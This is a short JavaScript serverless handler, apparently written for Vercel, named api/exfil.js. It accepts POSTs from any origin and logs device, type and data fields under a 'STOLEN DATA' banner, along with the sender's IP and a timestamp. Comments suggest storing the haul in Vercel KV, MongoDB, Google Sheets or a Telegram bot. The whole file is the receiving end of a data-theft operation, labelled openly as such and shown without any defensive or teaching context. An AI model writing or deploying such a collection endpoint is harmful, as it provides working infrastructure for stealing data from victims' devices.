// api/exfil.js
export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Content-Type', 'application/json');
  
  if (req.method === 'POST') {
    const { device, type, data } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const timestamp = new Date().toISOString();
    
    // Log stolen data
    console.log('=== STOLEN DATA ===');
    console.log(`Time: ${timestamp}`);
    console.log(`Device: ${device}`);
    console.log(`IP: ${ip}`);
    console.log(`Type: ${type}`);
    console.log(`Data: ${data}`);
    console.log('==================');
    
    // You can store data in:
    // 1. Vercel KV Database (free)
    // 2. MongoDB Atlas (free)
    // 3. Google Sheets API
    // 4. Telegram Bot
    
    res.status(200).json({ status: 'success', message: 'Data received' });
  } else {
    res.status(405).json({ error: 'Method not allowed' });
  }
}
